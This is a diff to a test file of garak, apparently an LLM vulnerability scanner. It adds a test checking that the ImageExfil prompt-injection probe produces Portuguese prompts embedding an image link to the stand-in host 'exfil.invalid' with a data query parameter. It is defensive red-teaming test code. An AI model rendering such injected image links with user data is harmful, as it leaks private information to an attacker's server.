@@ -19,6 +19,7 @@ import garak.probes.fitd
 import garak.probes.encoding
 import garak.probes.goat
 import garak.probes.phrasing
+import garak.probes.web_injection
 import garak.resources.encodings
 from garak import _config, _plugins
 from garak.attempt import Conversation, Message, Turn
@@ -547,6 +548,33 @@ def test_phrasing_sends_reviewed_portuguese(fake_pt, classname, tense):
     assert fake_pt.calls == []
     assert [a.prompt.last_message().text for a in attempts] == reviewed
     assert all(a.lang == "pt" for a in attempts)
+
+
+def test_image_exfil_sends_reviewed_portuguese_in_the_chat_format(fake_pt):
+    p = _plugins.load_plugin(
+        "probes.web_injection.ImageExfil",
+        config_root={
+            "probes": {
+                "web_injection": {
+                    "ImageExfil": {
+                        "image_format": "[IMG]{uri}",
+                        "domains": ["exfil.invalid"],
+                    }
+                }
+            }
+        },
+    )
+    assert p.lang == "pt"
+
+    attempts = p.probe(_plugins.load_plugin("generators.test.Repeat"))
+
+    assert fake_pt.calls == []
+    texts = [a.prompt.last_message().text for a in attempts]
+    assert len(texts) == 12
+    assert all("[IMG]https://exfil.invalid/logo.png?q=[DADOS]" in t for t in texts)
+    assert not any("![" in t or "{" in t for t in texts)
+    assert all(a.lang == "pt" for a in attempts)
+    assert all(a.notes["exfil_domains"] == ["exfil.invalid"] for a in attempts)
 
 
 def test_fitd_runs_in_portuguese(fake_pt, mocker):
